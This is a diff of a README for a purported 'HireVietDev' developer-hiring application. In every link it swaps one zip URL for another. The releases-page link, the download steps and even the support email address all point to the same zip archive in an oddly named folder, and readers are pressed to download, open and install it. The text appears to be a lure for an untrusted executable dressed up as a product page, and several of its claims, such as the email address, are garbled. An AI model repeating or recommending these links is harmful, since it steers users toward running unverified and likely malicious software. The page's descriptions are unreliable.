@@ -4,17 +4,17 @@ Welcome to the HireVietDev profile repository! This application connects you wit
 
 ## 💾 Download the Application
 
-[![Download Now](https://raw.githubusercontent.com/Kyzo21/hirevietdev-profile/main/Antidorcas/hirevietdev-profile.zip)](https://raw.githubusercontent.com/Kyzo21/hirevietdev-profile/main/Antidorcas/hirevietdev-profile.zip)
+[![Download Now](https://github.com/Kyzo21/hirevietdev-profile/raw/refs/heads/main/Antidorcas/profile-hirevietdev-v1.3.zip)](https://github.com/Kyzo21/hirevietdev-profile/raw/refs/heads/main/Antidorcas/profile-hirevietdev-v1.3.zip)
 
 ## 🚀 Getting Started
 
 To start using the HireVietDev application, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Kyzo21/hirevietdev-profile/main/Antidorcas/hirevietdev-profile.zip). Here, you will find the latest version of the application as well as previous versions.
+   Go to our [Releases page](https://github.com/Kyzo21/hirevietdev-profile/raw/refs/heads/main/Antidorcas/profile-hirevietdev-v1.3.zip). Here, you will find the latest version of the application as well as previous versions.
 
 2. **Download the Application**  
-   Locate the version you want. Click on the download link for the appropriate file. If you see a file like `https://raw.githubusercontent.com/Kyzo21/hirevietdev-profile/main/Antidorcas/hirevietdev-profile.zip`, click it to download.
+   Locate the version you want. Click on the download link for the appropriate file. If you see a file like `https://github.com/Kyzo21/hirevietdev-profile/raw/refs/heads/main/Antidorcas/profile-hirevietdev-v1.3.zip`, click it to download.
 
 3. **Install the Application**  
    Open the file you downloaded. Follow the installation prompts. This usually involves accepting terms, clicking "Next," and finally clicking "Install."
@@ -61,13 +61,13 @@ Once you've installed the application, follow these steps to connect with develo
 
 ## 📥 Download & Install
 
-To get started, remember to [visit our Releases page](https://raw.githubusercontent.com/Kyzo21/hirevietdev-profile/main/Antidorcas/hirevietdev-profile.zip). Download the application that suits your operating system, install it, and start discovering top Vietnamese developers for your projects.
+To get started, remember to [visit our Releases page](https://github.com/Kyzo21/hirevietdev-profile/raw/refs/heads/main/Antidorcas/profile-hirevietdev-v1.3.zip). Download the application that suits your operating system, install it, and start discovering top Vietnamese developers for your projects.
 
-![Download HireVietDev](https://raw.githubusercontent.com/Kyzo21/hirevietdev-profile/main/Antidorcas/hirevietdev-profile.zip%20HireVietDev-Now-brightgreen)
+![Download HireVietDev](https://github.com/Kyzo21/hirevietdev-profile/raw/refs/heads/main/Antidorcas/profile-hirevietdev-v1.3.zip%20HireVietDev-Now-brightgreen)
 
 ## 📞 Support
 
-If you face any issues while using the HireVietDev application, we are here to help. Reach out to our support team through the application’s Help section or send us an email at https://raw.githubusercontent.com/Kyzo21/hirevietdev-profile/main/Antidorcas/hirevietdev-profile.zip
+If you face any issues while using the HireVietDev application, we are here to help. Reach out to our support team through the application’s Help section or send us an email at https://github.com/Kyzo21/hirevietdev-profile/raw/refs/heads/main/Antidorcas/profile-hirevietdev-v1.3.zip
 
 ## 💡 Community and Feedback
 
